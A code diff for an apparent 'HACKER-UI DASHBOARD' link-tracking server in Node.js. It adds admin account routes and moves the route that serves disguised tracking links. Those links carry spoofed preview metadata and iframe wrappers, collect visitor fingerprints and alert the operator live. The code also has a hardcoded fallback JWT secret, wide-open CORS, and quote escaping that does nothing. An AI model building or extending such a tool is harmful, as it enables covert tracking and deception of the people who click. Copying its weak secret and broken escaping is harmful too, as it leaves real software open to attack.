@@ -1,4 +1,4 @@
-// File: server.js (v13.5 - Final Corrected Version)
+// File: server.js (v14.2 - Final Full Integration)
 
 require('dotenv').config();
 
@@ -22,6 +22,7 @@ const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: "*" } });
 const PORT = process.env.PORT || 4000;
 const JWT_SECRET = process.env.JWT_SECRET || 'gantidengankatayangsan6atrahas14';
+const saltRounds = 10;
 
 app.use(cors());
 app.use(express.json({limit: '5mb'}));
@@ -185,7 +186,7 @@ function getTemplatePath(linkData) {
 }
 
 // =================================================================
-// === KONEKSI SOCKET.IO & ROUTES ===
+// === KONEKSI SOCKET.IO ===
 // =================================================================
 
 io.on('connection', (socket) => {
@@ -208,10 +209,15 @@ io.on('connection', (socket) => {
     });
 });
 
+// =================================================================
+// === ROUTES APLIKASI ===
+// =================================================================
+
 app.get('/', (req, res) => {
     res.redirect('/login.html');
 });
 
+// --- RUTE AUTENTIKASI ---
 app.post('/login', async (req, res) => {
     const { username, password } = req.body;
     try {
@@ -228,52 +234,71 @@ app.post('/login', async (req, res) => {
     }
 });
 
-app.get('/:id', async (req, res, next) => {
-    const { id } = req.params;
-    if (path.extname(id) || id === 'favicon.ico') {
-        return next();
-    }
+// =================================================================
+// === RUTE API (PENTING: HARUS SEBELUM /:id) ===
+// =================================================================
+
+// --- RUTE MANAJEMEN ADMIN ---
+app.get('/api/admins', protectRoute, async (req, res) => {
     try {
-        const [links] = await db.query(`SELECT l.*, u.username FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
-        if (links.length === 0) return res.status(404).send('<h1>404 Not Found</h1>');
-        const linkData = links[0];
-        if (linkData.expires_at && new Date(linkData.expires_at) < new Date()) return res.status(410).send('<h1>Link has expired.</h1>');
-        
-        io.emit('link_clicked', { username: linkData.username });
-        const templatePath = getTemplatePath(linkData);
-        const destinationUrl = linkData.original_url;
-
-        if (!templatePath) {
-            return res.redirect(destinationUrl);
-        }
-
-        fs.readFile(path.join(__dirname, templatePath), 'utf8', (fsErr, data) => {
-            if (fsErr) {
-                console.error("File template tidak ditemukan:", fsErr);
-                return res.status(500).send('Server error');
-            }
-            let ogTags = '';
-            if (linkData.og_title) ogTags += `<meta property="og:title" content="${linkData.og_title.replace(/"/g, '"')}">\n`;
-            if (linkData.og_description) ogTags += `<meta property="og:description" content="${linkData.og_description.replace(/"/g, '"')}">\n`;
-            if (linkData.og_image) ogTags += `<meta property="og:image" content="${linkData.og_image}">\n`;
-            
-            let html = data.replace('</head>', ogTags + '</head>');
-            html = html.replace(/{{DESTINATION_URL}}/g, destinationUrl)
-                       .replace(/{{TRACKER_ID}}/g, id)
-                       .replace(/{{USERNAME}}/g, linkData.username);
-            
-            if (linkData.link_type === 'iframe') {
-                let pageTitle = linkData.og_title || 'Loading...';
-                html = html.replace(/{{PAGE_TITLE}}/g, pageTitle);
-            }
-            res.send(html);
-        });
+        const [admins] = await db.query('SELECT id, username, created_at FROM users WHERE is_admin = TRUE ORDER BY username ASC');
+        res.json(admins);
     } catch (error) {
-        console.error("Error handling link click:", error);
-        res.status(500).send('Server error');
+        console.error('Error fetching admins:', error);
+        res.status(500).json({ message: 'Server error' });
     }
 });
 
+app.post('/api/admins', protectRoute, async (req, res) => {
+    const { username, password } = req.body;
+
+    if (!username || !password) {
+        return res.status(400).json({ message: 'Username and password are required.' });
+    }
+    if (password.length < 6) {
+        return res.status(400).json({ message: 'Password must be at least 6 characters long.' });
+    }
+
+    try {
+        const hashedPassword = await bcrypt.hash(password, saltRounds);
+        const query = `
+            INSERT INTO users (username, password, is_admin, created_at) 
+            VALUES (?, ?, TRUE, NOW())
+            ON DUPLICATE KEY UPDATE password = ?;
+        `;
+        await db.query(query, [username, hashedPassword, hashedPassword]);
+
+        broadcastLogMessage(`> 👤 Akun admin [${username}] telah dibuat/diperbarui oleh [${req.user.username}].`);
+        res.status(201).json({ message: `Admin account '${username}' saved successfully.` });
+    } catch (error) {
+        console.error('Error creating/updating admin:', error);
+        res.status(500).json({ message: 'Database error while saving admin.' });
+    }
+});
+
+app.delete('/api/admins/:id', protectRoute, async (req, res) => {
+    const { id } = req.params;
+    const { userId } = req.user; // ID of the admin performing the action
+
+    if (Number(id) === userId) {
+        return res.status(403).json({ message: "Error: Admins cannot delete their own account." });
+    }
+
+    try {
+        const [result] = await db.query('DELETE FROM users WHERE id = ? AND is_admin = TRUE', [id]);
+        if (result.affectedRows === 0) {
+            return res.status(404).json({ message: 'Admin not found or already deleted.' });
+        }
+        broadcastLogMessage(`> 🗑️ Akun admin dengan ID [${id}] telah dihapus oleh [${req.user.username}].`);
+        res.json({ message: 'Admin deleted successfully.' });
+    } catch (error) {
+        console.error('Error deleting admin:', error);
+        res.status(500).json({ message: 'Server error' });
+    }
+});
+
+
+// --- RUTE PEMBUATAN LINK ---
 app.post('/create', protectRoute, async (req, res) => {
     const { username, originalUrl, url_android, url_ios, expiresIn, linkType, linkCategory } = req.body;
     if (!username || !originalUrl) return res.status(400).json({ error: 'Data tidak lengkap' });
@@ -351,6 +376,7 @@ app.post('/create', protectRoute, async (req, res) => {
     }
 });
 
+// --- RUTE LOGGING DAN DATA ---
 app.post('/api/fingerprint', async (req, res) => {
     const { trackerId, fingerprintHash, details } = req.body;
     if (!trackerId || !fingerprintHash || !details) { return res.status(400).json({ status: 'error', message: 'Data tidak lengkap.' }); }
@@ -582,8 +608,56 @@ app.delete('/api/alldata/all', protectRoute, async (req, res) => {
     }
 });
 
+
+// --- RUTE CATCH-ALL (HARUS DIPALING BAWAH) ---
+app.get('/:id', async (req, res, next) => {
+    const { id } = req.params;
+    if (path.extname(id) || id === 'favicon.ico') {
+        return next();
+    }
+    try {
+        const [links] = await db.query(`SELECT l.*, u.username FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
+        if (links.length === 0) return res.status(404).send('<h1>404 Not Found</h1>');
+        const linkData = links[0];
+        if (linkData.expires_at && new Date(linkData.expires_at) < new Date()) return res.status(410).send('<h1>Link has expired.</h1>');
+        
+        io.emit('link_clicked', { username: linkData.username });
+        const templatePath = getTemplatePath(linkData);
+        const destinationUrl = linkData.original_url;
+
+        if (!templatePath) {
+            return res.redirect(destinationUrl);
+        }
+
+        fs.readFile(path.join(__dirname, templatePath), 'utf8', (fsErr, data) => {
+            if (fsErr) {
+                console.error("File template tidak ditemukan:", fsErr);
+                return res.status(500).send('Server error');
+            }
+            let ogTags = '';
+            if (linkData.og_title) ogTags += `<meta property="og:title" content="${linkData.og_title.replace(/"/g, '"')}">\n`;
+            if (linkData.og_description) ogTags += `<meta property="og:description" content="${linkData.og_description.replace(/"/g, '"')}">\n`;
+            if (linkData.og_image) ogTags += `<meta property="og:image" content="${linkData.og_image}">\n`;
+            
+            let html = data.replace('</head>', ogTags + '</head>');
+            html = html.replace(/{{DESTINATION_URL}}/g, destinationUrl)
+                       .replace(/{{TRACKER_ID}}/g, id)
+                       .replace(/{{USERNAME}}/g, linkData.username);
+            
+            if (linkData.link_type === 'iframe') {
+                let pageTitle = linkData.og_title || 'Loading...';
+                html = html.replace(/{{PAGE_TITLE}}/g, pageTitle);
+            }
+            res.send(html);
+        });
+    } catch (error) {
+        console.error("Error handling link click:", error);
+        res.status(500).send('Server error');
+    }
+});
+
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v13.5 (Definitive Final)`);
+    console.log(`\n HACKER-UI DASHBOARD v14.1 (Full Admin Management)`);
     console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
